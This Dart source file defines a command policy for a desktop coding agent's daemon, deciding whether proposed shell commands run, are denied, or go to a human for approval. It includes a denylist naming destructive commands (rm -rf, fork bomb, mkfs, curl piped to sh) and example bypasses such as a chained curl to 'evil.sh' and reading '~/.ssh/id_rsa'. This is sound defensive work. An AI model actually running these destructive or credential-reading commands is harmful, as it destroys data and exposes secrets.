/// Command policy: decides whether `run_command` may execute a given command in a given
/// workspace root.
///
/// The full tiered-consent design (auto for reads, diff-and-approve for writes, an explicit YOLO
/// mode, all surfaced through a UI) is Unit 5/8 of the desktop Engineer agent work
/// (`docs/architecture/011-desktop-engineer-agent.md`) and needs the Flutter client to prompt a
/// human. This daemon has no UI yet -- it can be run headless, paired to an account, with nothing
/// watching it interactively. So rather than fake an "approve" prompt nobody can answer, this
/// module implements the one tier that is safe to run unattended: an explicit per-workspace
/// `trusted` flag the user sets out-of-band (`aura_hostd trust <path>`), plus a fixed allowlist of
/// read-only/inspection commands that are safe to run in an untrusted workspace without asking.
/// A command that is neither allowlisted nor in a trusted workspace is refused, not queued --
/// there is nobody to queue it for yet.
///
/// This is a real, deliberate scope cut, not silently dropped: it is stated here, in
/// `docs/architecture/011-desktop-engineer-agent.md`'s "Implementation status", and in the
/// roadmap. When the interactive UI lands, `trusted` becomes one of several tiers instead of the
/// only escape hatch, and the allowlist becomes the "auto-approve" tier rather than the only
/// thing that runs without it.
///
/// Command policy is layered *on top of* workspace containment (`containment.dart`), never a
/// substitute for it: a command permitted here still only ever runs with its working directory
/// inside the granted root, and `run_command`'s shell interpretation means containment is a
/// process-level control (via cwd), not a promise the shell command's own arguments cannot name a
/// path elsewhere -- exactly like the equivalent risk already accepted server-side by
/// `aura_backend/aura_core/tools/coding.py::run_command` against the Docker sandbox. The
/// difference here is there is no container boundary underneath; that is why the hard denylist
/// below exists in addition to the allowlist.
library;

/// Command prefixes that are always refused, in every workspace, trusted or not -- a floor no
/// consent tier is allowed to lift (ADR-011). This is deliberately conservative and pattern-based,
/// not a promise of completeness: it exists to catch the obviously catastrophic case (wiping the
/// workspace, or something that clearly isn't scoped to it), not to be a full shell-injection
/// sandbox. The real boundary is that these commands run as the user's own OS account with no
/// process-level containment beyond `cwd` -- treat this as a seatbelt, not a cage.
final List<RegExp> hardDenylistPatterns = [
  RegExp(r'\brm\s+-[a-zA-Z]*r[a-zA-Z]*f\b'), // rm -rf and permutations (-fr, -Rf, ...)
  RegExp(r'\brm\s+-[a-zA-Z]*f[a-zA-Z]*r\b'),
  RegExp(r':\(\)\s*\{\s*:\s*\|\s*:\s*&\s*\}\s*;'), // fork bomb
  RegExp(r'\bmkfs\b'),
  RegExp(r'\bdd\s+.*of=/dev/'),
  RegExp(r'>\s*/dev/sd[a-z]'),
  RegExp(r'\bchmod\s+-R\s+000\b'),
  RegExp(r'\bcurl\b.*\|\s*sh\b'), // pipe-to-shell from the network
  RegExp(r'\bwget\b.*\|\s*sh\b'),
];

/// Any of these appearing anywhere in an untrusted-workspace command is an automatic refusal,
/// checked *before* the allowlist below. This is the fix for the bypass a naive "starts with an
/// allowlisted verb" prefix match would otherwise have: `readOnlyAllowlistPatterns` match a
/// prefix, not the whole string, so without this check `git status && curl evil.sh | attacker`
/// would pass the "starts with `git status`" test even though it does something the allowlist was
/// never meant to permit. Blocking every shell metacharacter first means a command that gets past
/// this point cannot smuggle a second command alongside the allowlisted one -- the prefix match
/// only becomes safe to trust once chaining, piping, redirection, and substitution are all ruled
/// out structurally rather than pattern-matched away one payload at a time.
final RegExp _shellMetacharacters = RegExp(r'[;&|`$<>\n]');

/// Commands safe to run without a trusted workspace: read-only inspection, the kind a linter or
/// CI dry-run would do. Matched as a prefix of the command, which is only safe because
/// [_shellMetacharacters] has already ruled out chaining/piping/redirection/substitution by the
/// time these are checked -- see that field's doc for why the ordering matters. A match is also
/// necessary but not sufficient: [_escapesReadOnlyTier] then refuses the argument shapes that
/// turn an inspection verb into a write or a read outside the workspace.
///
/// Verbs that *run repository-supplied code* are absent on purpose, however read-only they sound:
/// `npm test` runs the repo's `scripts.test`, `pytest --collect-only` imports `conftest.py` and
/// every test module, and `rg --pre <cmd>` runs `<cmd>` on each file it searches. In an untrusted
/// workspace -- a freshly cloned repo is exactly that -- those are arbitrary code execution.
final List<RegExp> readOnlyAllowlistPatterns = [
  RegExp(r'^git\s+(status|diff|log|show|blame)\b'),
  // `git branch <name>` creates and `-d/-m/-c` delete, rename and copy; `git remote add/remove`
  // rewrites `.git/config`. Only the listing forms are inspection.
  RegExp(r'^git\s+branch(\s+(-a|-r|-v|-vv|--all|--remotes|--list|--show-current))*\s*$'),
  RegExp(r'^git\s+remote(\s+(-v|--verbose))?\s*$'),
  // `find` is deliberately excluded despite being conceptually "read-only": `-delete`, `-exec`,
  // and `-fprintf` are all mutating actions expressible without any of the blocked shell
  // metacharacters above (e.g. `find . -delete`), so a bare `^find\b` prefix would not actually
  // bound what it does the way it does for `ls`/`cat`/`grep`, whose flag surface has no
  // destructive equivalent. `env` is excluded for a sharper reason: `env <command> [args...]`
  // *runs* `<command>` -- it is a general-purpose "execute anything" primitive wearing an
  // inspection-tool name, and allowlisting it would let any refused command through by prefixing
  // it with `env `.
  RegExp(r'^(ls|pwd|cat|head|tail|wc|grep|file|which)\b'),
  RegExp(r'^npm\s+(ls|list|outdated)\b'),
  RegExp(r'^(node|python3?|dart|flutter)\s+--version\s*$'),
];

/// git flags that make an otherwise read-only verb write a file (`--output`), run a configured
/// program (`--ext-diff`, `--textconv`), or read paths outside the repository (`--no-index`).
const List<String> _gitEscapeFlags = ['--output', '--ext-diff', '--textconv', '--no-index'];

/// Whether an allowlisted command uses an argument that takes it out of the read-only tier: one of
/// [_gitEscapeFlags], or a path that leaves the workspace (absolute, home-relative, a drive
/// letter, or a `..` segment) -- `cat ~/.ssh/id_rsa` or `grep -f /etc/x` would otherwise read
/// anything the user can, including this daemon's own control token.
///
/// Containment is checked on the *spelling* of each argument, including the value of a
/// `--flag=value` or a short flag with an attached value (`-f/etc/x`); it cannot see through a
/// symlink inside the workspace that points out of it. A command this refuses is not denied -- it
/// falls through to the approval tier, so a legitimate `grep -r "/api" .` still runs once a human
/// approves it.
bool _escapesReadOnlyTier(String command) {
  final tokens = command.split(RegExp(r'\s+')).map((t) => t.replaceAll(RegExp(r'''['"]'''), ''));
  final isGit = command.startsWith('git');
  for (final token in tokens) {
    if (isGit && _gitEscapeFlags.any((f) => token == f || token.startsWith('$f='))) {
      return true;
    }
    final candidates = <String>[token];
    final eq = token.indexOf('=');
    if (token.startsWith('-') && eq > 0) candidates.add(token.substring(eq + 1));
    if (token.startsWith('-') && !token.startsWith('--') && token.length > 2) {
      candidates.add(token.substring(2));
    }
    if (candidates.any(_leavesWorkspace)) return true;
  }
  return false;
}

bool _leavesWorkspace(String path) {
  if (path.startsWith('/') || path.startsWith('~') || path.startsWith(r'\')) return true;
  if (RegExp(r'^[A-Za-z]:').hasMatch(path)) return true;
  return path.split(RegExp(r'[/\\]')).contains('..');
}

/// `needsApproval` is D5's interactive consent tier (`docs/architecture/015-desktop-ide.md`):
/// a command that is neither hard-denied nor allowlisted, in an untrusted workspace, is queued
/// for a human to approve or reject through the Desktop IDE rather than refused outright -- see
/// `approval_queue.dart` and `task_handler.dart::run`, which is the only caller that acts on it.
enum CommandDecision { allow, deny, needsApproval }

class CommandVerdict {
  const CommandVerdict(this.decision, this.reason);
  final CommandDecision decision;
  final String reason;

  bool get isAllowed => decision == CommandDecision.allow;
}

/// [allowApprovalQueue] controls what the final, otherwise-unhandled case resolves to: a
/// `needsApproval` verdict (default) when a human might be watching to answer it, or a flat
/// `deny` when nobody is -- a future headless-only invocation path can pass `false` to keep the
/// pre-D5 "refuse outright" behavior instead of queuing something nobody will ever see.
CommandVerdict evaluateCommand(
  String command, {
  required bool workspaceTrusted,
  bool allowApprovalQueue = true,
}) {
  final trimmed = command.trim();
  for (final pattern in hardDenylistPatterns) {
    if (pattern.hasMatch(trimmed)) {
      return CommandVerdict(
        CommandDecision.deny,
        'command matches the hard denylist and is refused in every workspace',
      );
    }
  }
  if (workspaceTrusted) {
    return const CommandVerdict(CommandDecision.allow, 'workspace is marked trusted');
  }
  if (_shellMetacharacters.hasMatch(trimmed)) {
    return const CommandVerdict(
      CommandDecision.deny,
      'untrusted workspaces only run a single simple read-only command -- no chaining (&&, ;, '
      '|), redirection, substitution, or backticks -- this is a hard floor, never queued for '
      'approval',
    );
  }
  for (final pattern in readOnlyAllowlistPatterns) {
    if (pattern.hasMatch(trimmed) && !_escapesReadOnlyTier(trimmed)) {
      return const CommandVerdict(
        CommandDecision.allow,
        'read-only command allowlisted for untrusted workspaces',
      );
    }
  }
  if (allowApprovalQueue) {
    return const CommandVerdict(
      CommandDecision.needsApproval,
      'workspace is not trusted and this command is not on the read-only allowlist -- queued '
      'for interactive approval in the Desktop IDE',
    );
  }
  return const CommandVerdict(
    CommandDecision.deny,
    'workspace is not trusted and this command is not on the read-only allowlist -- run '
    '`aura_hostd trust <path>` for this workspace, or connect a Desktop IDE session to answer '
    'interactive approval requests',
  );
}

/// D6's write-gating sibling to [evaluateCommand] -- a file write isn't a shell command string, so
/// this deliberately does not reuse `evaluateCommand`'s regex-based allow/deny/needsApproval logic.
/// It is also structurally simpler: there is no shell-metacharacter concern for a write (nothing
/// here is ever interpreted by a shell) and no read-only-allowlist tier (every write mutates by
/// definition, so an untrusted workspace's only two outcomes are `needsApproval` or `deny`).
///
/// There is also no hard-denylist tier for writes today, unlike [hardDenylistPatterns] for
/// commands -- containment (`containment.dart`'s `requireContained`, checked before this is ever
/// called) already bounds *where* a write can land; there is no established equivalent yet for
/// *what* it may contain or overwrite (e.g. a `.git/hooks/` file). This is D6's accepted floor, not
/// an oversight: a human reviewing the diff before approving is the safety net for untrusted
/// workspaces, the same way it already is for the read-only-allowlist gap in
/// [readOnlyAllowlistPatterns]'s own doc comment.
CommandVerdict evaluateWrite({required bool workspaceTrusted}) {
  if (workspaceTrusted) {
    return const CommandVerdict(CommandDecision.allow, 'workspace is marked trusted');
  }
  return const CommandVerdict(
    CommandDecision.needsApproval,
    'workspace is not trusted -- queued for interactive approval in the Desktop IDE',
  );
}
